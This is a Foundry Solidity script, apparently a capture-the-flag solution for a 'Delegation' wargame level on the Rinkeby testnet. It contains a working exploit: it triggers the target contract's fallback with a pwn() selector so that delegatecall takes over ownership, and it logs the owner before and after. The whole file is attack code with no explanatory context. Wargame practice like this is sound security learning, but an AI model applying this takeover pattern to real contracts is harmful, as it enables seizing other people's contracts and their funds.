// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { Script } from "forge-std/script.sol";
import { console } from "forge-std/console.sol";

import { Delegation } from "src/Delegation/Delegation.sol";

contract DelegationAttackScript is Script {
    // affected contract: https://rinkeby.etherscan.io/address/0x11b4515712c827f6f868a3db4205a964efc5a5ad

    function run() public {
        vm.startBroadcast();
            address delegationTarget = address(0x11B4515712C827F6f868a3Db4205a964eFC5a5Ad);
            console.logString("ORIGINAL OWNER:::");
            (bool success, bytes memory data) = delegationTarget.call(abi.encodeWithSelector(bytes4(keccak256("owner()"))));
            console.logBytes(data);

            (success, ) = delegationTarget.call(abi.encodeWithSelector(bytes4(keccak256("pwn()"))));
            console.logString("FALLBACK FUNCTION CALL RESULT:::");
            console.logBool(success);
            console.logString("NEW OWNER:::");
            (success, data) = delegationTarget.call(abi.encodeWithSelector(bytes4(keccak256("owner()"))));
            console.logBytes(data);
        vm.stopBroadcast();
    }
}
